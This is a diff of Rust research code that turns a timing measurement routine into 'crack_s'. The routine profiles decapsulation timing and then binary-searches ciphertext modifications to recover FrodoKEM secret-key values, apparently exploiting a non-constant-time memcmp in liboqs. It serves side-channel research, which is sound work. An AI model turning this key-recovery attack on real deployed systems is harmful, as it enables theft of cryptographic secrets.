@@ -1,4 +1,5 @@
 use super::modify_and_measure::*;
+use crate::attack::memcmp_frodo::profile::profile;
 use crate::attack::memcmp_frodo::MeasureSource;
 use crate::utils::Recorder;
 use liboqs_rs_bindings as oqs;
@@ -19,6 +20,7 @@ fn search_modification<FRODO: FrodoKem>(
     secret_key: &mut FRODO::SecretKey,
 ) -> Result<u16, String> {
     let maxmod = max_mod::<FRODO>();
+    warn!("TODO: check if max_mod is correctly used here");
     let mut high = maxmod;
     let mut low = 0;
     let found = loop {
@@ -78,13 +80,14 @@ fn search_modification<FRODO: FrodoKem>(
 }
 
 #[logfn_inputs(Trace)]
-pub fn find_e<FRODO: FrodoKem>(
+pub fn crack_s<FRODO: FrodoKem>(
     warmup: usize,
     iterations: usize,
+    profileiters: usize,
     measure_source: MeasureSource,
 ) -> Result<(), String> {
     info!(
-        "Launching the find_e routine against {} MEMCMP vulnerability.",
+        "Launching the crack_s routine against {} MEMCMP vulnerability.",
         FRODO::name()
     );
     let mut public_key = FRODO::PublicKey::new();
@@ -94,85 +97,50 @@ pub fn find_e<FRODO: FrodoKem>(
     info!("Generating keypair");
     FRODO::keypair(&mut public_key, &mut secret_key)?;
 
-    info!("Encapsulating shared secret and generating ciphertext");
     let mut shared_secret_e = FRODO::SharedSecret::new();
     let mut shared_secret_d = FRODO::SharedSecret::new();
-    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
 
-    info!("Running decryption oracle {} times for warmup.", warmup);
-    let warmuptime = mod_measure::<FRODO, _>(
-        0,
-        0,
+    let threshold = profile::<FRODO>(
         warmup,
-        &measure_source,
-        &mut ciphertext,
-        &mut shared_secret_d,
+        profileiters,
+        measure_source,
+        &mut public_key,
         &mut secret_key,
-        &mut Recorder::minval(),
-    )?;
-    debug!("Warmup time {}", warmuptime);
-
-    let last_index = FRODO::C::len() - 1;
-    let lowmod = 1;
-
-    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish upper bound timing threshold.", iterations, last_index, lowmod);
-    let threshold_high = mod_measure::<FRODO, _>(
-        lowmod,
-        last_index,
-        iterations,
-        &measure_source,
-        &mut ciphertext,
-        &mut shared_secret_d,
-        &mut secret_key,
-        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, lowmod)),
     )?;
 
-    let maxmod = max_mod::<FRODO>();
+    let n = FRODO::params().PARAM_N;
+    let nbar = FRODO::params().PARAM_NBAR;
+    let mbar = nbar;
+    let err_corr_limit = max_mod::<FRODO>();
 
-    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish lower bound timing threshold.", iterations, last_index, maxmod);
-    let threshold_low = mod_measure::<FRODO, _>(
-        maxmod,
-        last_index,
-        iterations,
-        &measure_source,
-        &mut ciphertext,
-        &mut shared_secret_d,
-        &mut secret_key,
-        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, maxmod)),
-    )?;
-
-    let threshold = (threshold_high + threshold_low) / 2;
-    info!(
-        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
-        threshold
-    );
-
-    let mods : Result<Vec<_>, String> = (0..FRODO::C::len()).map(|index_ij|{
-        info!("C[{}/{}] => Starting binary search for determining maximum modifications to C without affecting B, for this index.", index_ij, FRODO::C::len()-1);
-
-        let themod = search_modification::<FRODO>(
-            index_ij,
-            iterations,
-            &measure_source,
-            threshold,
-            &mut ciphertext,
-            &mut shared_secret_d,
-            &mut secret_key,
-        )?;
-
+    for t in 0..n {
         info!(
-            "C[{}/{}] => Found {}!",index_ij, FRODO::C::len()-1,
-            themod
+            "Using MODCAPS to generate fake ciphertext with S' = 0, E'' = 0 and with E'[{},{}] = 1",
+            mbar - 1,
+            t
         );
 
-        Ok(themod)
-    }).collect();
+        //TODO modified encaps
+        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
 
-    //bailout on error
-    let mods = mods?;
+        for j in 0..nbar {
+            // Modify ciphertext at C[nbar-1, j]
+            let index = (mbar - 1) * nbar + j;
 
-    info!("We have found all mods!");
-    info!("{:?}", mods);
+            let x0 = search_modification::<FRODO>(
+                index,
+                iterations,
+                &measure_source,
+                threshold,
+                &mut ciphertext,
+                &mut shared_secret_d,
+                &mut secret_key,
+            )?;
+
+            let Eppp_ij = err_corr_limit - x0;
+            info!("Found -S[{},{}]={}", t, j, Eppp_ij);
+        }
+    }
 
     Ok(())
 }
